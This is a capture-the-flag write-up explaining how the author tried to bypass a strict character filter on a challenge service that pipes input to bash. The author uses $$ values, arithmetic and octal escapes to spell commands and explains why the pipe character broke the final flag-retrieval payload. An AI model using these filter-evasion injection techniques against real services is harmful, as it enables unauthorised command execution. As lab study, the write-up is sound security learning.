# echoechoechoecho and why I failed

The input restriction on remote:

```python
if not all(ord(c) < 128 for c in payload):
    bye("ERROR ascii only pls")

if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
    bye("ERROR invalid characters")

# real echolords probably wont need more special characters than this
if payload.count("+") > 1 or \
        payload.count("'") > 1 or \
        payload.count(")") > 1 or \
        payload.count("(") > 1 or \
        payload.count("=") > 2 or \
        payload.count(";") > 3 or \
        payload.count(" ") > 30:
    bye("ERROR Too many special chars.")
    
```

If we pass this filter, we can also specify number of pipes to bash that we want to append to our input. So at the end, following command pattern will be invoked on remote:

```
<command> + "|bash" * <no_repeats>
```

So if we pass for example `echo echo echoecho` as command and `1` as repeat steps, the following command will be executed: `echo echo echoecho|bash` and at the output we'll see `echoecho`. 

After investigation I found out that `$$` evaluates to `8` for the first bash, `10` for the second bash and `11` for the third bash and so on (and it constant for all requests). So after passing `echo echo echo $$ \$\$ \\$\\$` and `3` as a repeat count, we'll see `8 10 11` at the output.

Next step is to use arithmetic operations inside `$(( ))` to get every number we need, but we have to pass the restrictions on special characters by declaring special characters:

```
echoecho=\=;\
echo \
echoecho$echoecho\\\+ \
echoechoecho$echoecho\\\( \ 
echoechoechoecho$echoecho\\\) \ 
echoechoechoechoecho$echoecho\$ \ 
echoechoechoechoechoecho$echoecho\\\' \
echoechoechoechoechoechoecho$echoecho\\\\' 
```

At this point we can get every number by adding `8`, `10` or `11` e.g. `$((8+11+11+12))` what will be evaluated to `42`. Now we can wrap this number in `$'\<num>'` and after pipe it will be evaluated to printable form of ASCII character at index `num` in octal.

```bash
$'\154'$'\163' -> ls

$ echo "$'\154'$'\163'" | xxd
00000000: 2427 5c31 3534 2724 275c 3136 3327 0a    $'\154'$'\163'.

$ echo "$'\154'$'\163'" | bash
almost_writeup.md  echoecho_final.py  echoecho.py  echosvr.py
```

After I've managed to construct payload that evaluates to `$'\154'$'\163' ` (`ls`) and I actually got the `ls` output from remote I've started construction of final payload. The command that I thought would give me the flag (and later turned out that the command was actually correct):

`bash -c 'expr $(grep + tmp/a)'|/get_flag>tmp/a;cat tmp/a` 

But something else was incorrect...

(lets simplify `bash -c 'expr $(grep + tmp/a)'|/get_flag>tmp/a;cat tmp/a`  to `ls | wc` just to make listing short)

```bash
'\154'$'\163' $'\174' $'\164'$'\162' -> ls | wc

$ echo "$'\154'$'\163' $'\174' $'\167'$'\143'" | xxd
00000000: 2427 5c31 3534 2724 275c 3136 3327 2024  $'\154'$'\163' $
00000010: 275c 3137 3427 2024 275c 3136 3727 2427  '\174' $'\167'$'
00000020: 5c31 3433 270a                           \143'.

$ echo "$'\154'$'\163' $'\174' $'\167'$'\143'" | bash
ls: cannot access '|': No such file or directory
ls: cannot access 'wc': No such file or directory
```

So piping in octal form does not work for `|` but it works for other ascii characters. Unfortunately, I've made an assumption that it works for all ascii chars, including `|`, this bad assumption cost me the flag.

What should I do then to get flag?

```bash
$ echo echo "$'\154'$'\163' $'\174' $'\167'$'\143'" | bash | bash
      4       4      59
```

Damn it.